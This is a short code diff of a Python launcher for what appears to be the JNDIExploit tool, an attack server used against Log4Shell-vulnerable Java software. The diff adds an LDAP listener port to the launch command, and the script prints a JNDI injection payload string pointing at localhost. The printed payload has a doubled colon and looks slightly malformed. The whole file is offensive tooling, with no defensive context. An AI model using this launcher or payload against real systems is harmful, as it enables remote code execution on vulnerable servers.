@@ -1,6 +1,6 @@
 import subprocess,os,sys,base64
 Path="java"
-command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000"]
+command=[Path,"-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000","-l","3380"]
 subp = os.system(" ".join(command)+" -u")
 
 print("Generate:${jndi:ldap:://127.0.0.1/} ")
